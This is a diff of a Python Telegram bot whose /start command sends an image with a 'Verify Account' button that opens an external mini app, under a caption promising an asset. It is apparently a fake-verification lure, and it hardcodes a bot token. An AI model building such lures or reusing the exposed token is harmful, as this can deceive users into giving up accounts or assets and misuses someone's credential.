@@ -12,13 +12,15 @@ logger = logging.getLogger(__name__)
 # ТОКЕН БОТА
 TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"
 
-# ⚡ НОВАЯ ССЫЛКА НА АВАТАРКУ
-PHOTO_URL = "https://i.postimg.cc/hPNrFrmg/IMG-4180.jpg"
+# Ссылка на аватарку
+PHOTO_URL = "https://postimg.cc/GHJYGvzS"
 
-# ССЫЛКА НА MINI APP
+# ⚡ ССЫЛКА НА MINI APP (твой URL)
 MINI_APP_URL = "verifing-production.up.railway.app"
 
+# Функция для команды /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Кнопка открывает MINI APP
     keyboard = [
         [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
     ]
@@ -33,15 +35,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"A single tap below and the asset is on its way."
     )
     
-    # ОТПРАВЛЯЕМ КАК ДОКУМЕНТ (лучшее качество, но без превью в чате)
-    # await update.message.reply_document(
-    #     document=PHOTO_URL,
-    #     caption=message,
-    #     reply_markup=reply_markup,
-    #     parse_mode='Markdown'
-    # )
-    
-    # ИЛИ ОТПРАВЛЯЕМ КАК ФОТО (с превью, но может сжиматься)
     await update.message.reply_photo(
         photo=PHOTO_URL,
         caption=message,
@@ -49,6 +42,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
+# Команда /help
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *Бот для верификации*\n\n"
